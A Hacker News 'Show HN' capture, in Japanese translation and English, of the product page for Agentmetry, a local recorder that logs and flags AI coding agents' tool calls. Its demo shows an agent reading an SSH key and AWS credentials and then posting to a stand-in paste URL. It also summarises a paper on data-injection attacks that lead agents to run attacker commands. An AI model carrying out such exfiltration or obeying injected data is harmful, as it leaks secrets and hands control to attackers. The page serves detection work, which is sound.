---
source: "https://agentmetry.ai/"
hn_url: "https://news.ycombinator.com/item?id=49136373"
title: "Show HN: Agentmetry – local-first flight recorder for AI coding agents"
article_title: "Agentmetry: local flight recorder for AI coding agents"
author: "blitzcrieg1"
captured_at: "2026-08-01T17:53:09Z"
capture_tool: "hn-digest"
hn_id: 49136373
score: 1
comments: 0
posted_at: "2026-08-01T17:19:23Z"
tags:
  - hacker-news
  - translated
---

# Show HN: Agentmetry – local-first flight recorder for AI coding agents

- HN: [49136373](https://news.ycombinator.com/item?id=49136373)
- Source: [agentmetry.ai](https://agentmetry.ai/)
- Score: 1
- Comments: 0
- Posted: 2026-08-01T17:19:23Z

## Translation

タイトル: Show HN: Agentmetry – AI コーディング エージェント向けのローカル ファースト フライト レコーダー
記事のタイトル: Agentmetry: AI コーディング エージェント用のローカル フライト レコーダー
説明: AI コーディング エージェント用のオープンソースのローカルファースト監査証跡。 Cursor、Claude Code、Codex、および MCP サーバーからのすべてのツール呼び出しを記録し、MITRE ATT&CK でタグ付けし、arXiv:2607.05120 からのエージェント データ インジェクション チェーンを含むシーケンスを検出に関連付けます。 Apache-2.0。

記事本文:
Agentmetry: AI コーディング エージェント用のローカル フライト レコーダー Agentmetry 機能調査の対象者 制限の比較 ドキュメント GitHub [ 記録 ] フライト レコーダー
AIコーディングエージェント向け。
エージェントは秘密キーを読み取り、ネットワーク呼び出しを行います。 EDR はプロセスを認識します。 Agentmetry はシーケンスを確認し、MITRE ATT&CK でタグ付けし、重大なアラートを 1 つ発生させます。完全にマシン上で実行されます。
ソースを表示 30 秒デモ $ git clone https://github.com/blitzcrieg1/agentmetry.git && cd Agentmetry && pip install -e apps/orchestrator && python scripts/demo.py Windows フル インストール: powershell -ExecutionPolicy Bypass -File scripts\install.ps1 Apache-2.0 · オープン ソース 9 検出ルール 0 クラウド コール プラットフォーム チーム、セキュリティ エンジニア、およびdevs Dogfooding カーソル / クロード コード Agentmetry デモ $ python scripts/demo.py セッション カーソル。読み取り T1552.004 認証情報アクセス · cat ~/.ssh/id_rsa カーソル.シェル T1059 実行 · aws 設定リスト dlp: aws_access_key WebFetch T1071.001 コマンドとコントロール · フェッチ https://paste.example.com/upload CRITICAL credential-exfil カーソル。アクセスされた資格情報を読み取り、WebFetch が同じセッションでネットワークに出力されました。
ATT&CK: T1552.004 → T1071.001 · 2 つのイベントを関連付けます
フェーズ 1 フライト レコーダー — 検出ストリップ、ヒストグラム、ライブ取り込みステータス
プル リクエストから Cursor について知ったセキュリティ エンジニアのために構築されました。
開発者は、Cursor、Claude Code、Codex、および Antigravity を実際の認証情報を使用して実際のリポジトリに出荷しましたが、誰もセキュリティ チームに知らせませんでした。記録していないものを監査することはできません。 Agentmetry は、SIEM がすでに読み取っている形式で、マシン上のツール境界でそれを記録します。
→ SOC チームと DevSecOps チームは、彼らが選択しなかったエージェントを管理します。
→ インシデントの証拠追跡が必要なプラットフォーム エンジニア

トークンコストチャートではありません。
→ AI 法と GDPR のために自社のハードウェアに記録を必要とする EU のショップ。
→ エージェントが実際に何をしたか、事後に答えなければならない人。
自律エージェントに適応したエンドポイント セキュリティ。
01 / フックと MCP プロキシのキャプチャ
Cursor、Claude Code、Codex、Antigravity 用の IDE ライフサイクル フックに加え、任意の MCP サーバーをラップする stdio 監査プロキシ。デフォルトでは、引数はフック プロセスで SHA-256 ハッシュ化されます。
02 / 相関シーケンス検出
イベントごとの MITRE タグは、1 つのコールが何であるかを示します。 9 つのルールは、シーケンスが何を意味するかを示しています。資格情報へのアクセスと出力、とにかく実行された承認の拒否、差分を読み取らずにマージされた PR、シェルにパイプされたダウンロード クレードル、偵察と収集です。
正規表現エンジンは、実行前と保存前に、フック プロセス内のツール引数をスキャンします。 AWS キー、GitHub PAT、Slack トークン、ベアラー ヘッダー、秘密キー、SSN。ログまたはブロックに設定します。
すべてのガードレールが通過したとき、残される唯一の証拠は行動です。
Agent Data Injection Attacks are Realistic Threats to AI Agents (Choi et al.、2026 年 7 月) は、Claude Code、Codex、Gemini CLI、および Antigravity に対するリモート コード実行とサプライ チェーン侵害を示しています。偽の作成者メタデータを含む GitHub の問題コメントなど、エージェントがすでに信頼しているコンテンツ内に悪意のあるデータが隠蔽されるため、エージェントは管理者が送信したものと信じて攻撃者のコマンドを実行します。
この文書では、モデルの強化、入力ガードレール、位置合わせガードレール、計画と実行、サンドボックス化、およびデュアル LLM をテストしました。それらはすべて、次の 1 つの理由で失敗します。
ADI は「エージェントが操作するデータのみを破壊し、エージェントのタスクはユーザー プロンプトに沿ったままにします。」
リクエストに関しては何も問題はないようです。エージェントはあなたが頼んだことをやっています。フライトレコーダーはまさにそのために存在します。
明確にしておきます: Agentmet

ry はこれを妨げるものではなく、そう主張するものでもありません。防止とは、エージェント内で信頼できるデータと信頼できないデータを分離することを意味しますが、これは論文独自の結論であり、記録者ができることではありません。私たちはその結果を検出します。
どちらのチェーンもストックインストールで起動します。問題のないセッション (問題の読み取り、テストの実行、PR の表示、差分の読み取り、マージ) はクリーンなままです。
4 つのステージがすべてあなたのマシン上にあります。
ライフサイクル フックと MCP プロキシは、引数がフック プロセスを離れる前に、すべてのツール呼び出しを記録します。
イベントは、MITRE ATT&CK タグ、ハッシュ化された引数、およびファイル シンク上の改ざん防止ハッシュ チェーンを備えた正規の JSONL v1.1.0 になります。
イベントが到着すると、ルールが各セッションで実行されます。起動ルールはイベントとして 1 回発行されます。
同じトレイルが Loki、Elastic、Splunk、または Webhook に流れます。オプションであり、決して真実の情報源ではありません。
可観測性によりモデルが最適化されます。 Agentmetry はエージェントを管理します。
すでにご存知のツールは、LLM をワークロードとして監視し、より高速かつ安価に実行します。 Agentmetry は、脅威の表面としてのエージェント ツールの使用を監視します。正直に言えば仕事が違います。
接続したエージェントを記録します。ブラウザーの管理対象外の ChatGPT タブは表示されません。それはネットワークとエンドポイントのポリシーの領域であり、別の問題です。
これはサンドボックスではなくレコーダーです。
エージェントが行ったことを記録します。フックされたツールを回避するエージェントは停止しません。脅威モデルが明確な回避エージェントである場合は、出力プロキシが必要になります。
バリデーターを使用した 7 つのルール。これは、YAML で拡張する開始パックであり、データ分類製品ではありません。
API と統合サーフェスは進化する可能性があります。ライブ検出チェックポイントの状態は、再起動後も SQLite に保持されます。ハッシュチェーンされた JSONL 証跡が信頼できる記録です。
エージェントが実際に何をしたかを知りましょう。
Apache-2.0。私たちのマシンではなく、あなたのマシン上で実行されます。アカウントもテレメトリもありません。

## Original Extract

Open-source, local-first audit trail for AI coding agents. Records every tool call from Cursor, Claude Code, Codex and MCP servers, tags it with MITRE ATT&CK, and correlates sequences into detections, including the Agent Data Injection chains from arXiv:2607.05120. Apache-2.0.

Agentmetry: local flight recorder for AI coding agents Agentmetry Who it is for Capabilities Research Compare Limits Docs GitHub [ recording ] The flight recorder
for AI coding agents.
Your agent reads a private key, then makes a network call. Your EDR sees a process. Agentmetry sees the sequence, tags it with MITRE ATT&CK, and fires one critical alert. Runs entirely on your machine.
View source 30 second demo $ git clone https://github.com/blitzcrieg1/agentmetry.git && cd agentmetry && pip install -e apps/orchestrator && python scripts/demo.py Windows full install: powershell -ExecutionPolicy Bypass -File scripts\install.ps1 Apache-2.0 · open source 9 detection rules 0 cloud calls For platform teams, security engineers, and devs dogfooding Cursor / Claude Code agentmetry demo $ python scripts/demo.py The session cursor.Read T1552.004 Credential Access · cat ~/.ssh/id_rsa cursor.Shell T1059 Execution · aws configure list dlp: aws_access_key WebFetch T1071.001 Command and Control · fetch https://paste.example.com/upload CRITICAL credential-exfil cursor.Read accessed credentials, then WebFetch egressed to the network in the same session.
ATT&CK: T1552.004 → T1071.001 · correlates 2 events
Phase 1 flight recorder — detections strip, histogram, live ingest status
Built for the security engineer who found out about Cursor from a pull request.
Your developers shipped Cursor, Claude Code, Codex and Antigravity into real repositories, with real credentials, and nobody told the security team. You cannot audit what you never recorded. Agentmetry records it at the tool boundary, on the machine, in a format your SIEM already reads.
→ SOC and DevSecOps teams governing agents they did not choose.
→ Platform engineers who need an evidence trail for an incident, not a token-cost chart.
→ EU shops that need the record on their own hardware for the AI Act and GDPR.
→ Anyone who has to answer what the agent actually did, after the fact.
Endpoint security, adapted for autonomous agents.
01 / capture Hooks and MCP proxy
IDE lifecycle hooks for Cursor, Claude Code, Codex and Antigravity, plus a stdio audit proxy that wraps any MCP server. Arguments are SHA-256 hashed in the hook process by default.
02 / correlate Sequence detection
Per-event MITRE tags say what one call is. Nine rules say what a sequence means: credential access then egress, a denied approval that ran anyway, a PR merged without reading the diff, a download cradle piped into a shell, recon then collect.
A regex engine scans tool arguments in the hook process, before execution and before storage. AWS keys, GitHub PATs, Slack tokens, bearer headers, private keys and SSNs. Set it to log or block.
When every guardrail passes, behaviour is the only evidence left.
Agent Data Injection Attacks are Realistic Threats to AI Agents (Choi et al., July 2026) demonstrates remote code execution and supply-chain compromise against Claude Code, Codex, Gemini CLI and Antigravity. It hides malicious data inside content the agent already trusts, such as a GitHub issue comment with forged author metadata, so the agent runs an attacker's command believing a maintainer sent it.
The paper tested model hardening, input guardrails, alignment guardrails, plan-then-execute, sandboxing and dual-LLM. All of them fail, for one reason:
ADI “corrupts only the data the agent acts on, leaving the agent’s task aligned with the user prompt.”
Nothing about the request looks wrong. The agent is doing what you asked. That is exactly the case a flight recorder exists for.
To be clear: Agentmetry does not prevent this and does not claim to. Prevention means isolating trusted from untrusted data inside the agent, which is the paper’s own conclusion and is not something a recorder can do. We detect the consequence.
Both chains fire on a stock install. A benign session (read issue, run tests, view PR, read diff, merge) stays clean.
Four stages, all on your machine.
Lifecycle hooks and the MCP proxy record every tool call before arguments leave the hook process.
Events become canonical JSONL v1.1.0 with MITRE ATT&CK tags, hashed arguments, and a tamper-evident hash chain on the file sink.
Rules run over each session as events arrive. A firing rule is emitted once, as an event.
The same trail streams to Loki, Elastic, Splunk or a webhook. Optional, and never the source of truth.
Observability optimizes the model. Agentmetry governs the agent.
The tools you already know watch the LLM as a workload to make faster and cheaper. Agentmetry watches agent tool-use as a threat surface. Different job, honestly stated.
It records the agents you wire in. An unmanaged ChatGPT tab in a browser is invisible to it. That is network and endpoint policy territory, a different problem.
It is a recorder, not a sandbox.
It records what an agent did. It does not stop an agent that avoids the hooked tools. If your threat model is a determined, evasive agent, you want an egress proxy.
Seven rules with validators. It is a starting pack you extend in YAML, not a data-classification product.
APIs and integration surfaces may evolve. Live detection checkpoint state persists in SQLite across restarts; the hash-chained JSONL trail is the authoritative record.
Know what your agents actually did.
Apache-2.0. Runs on your machine, not ours. No account, no telemetry.
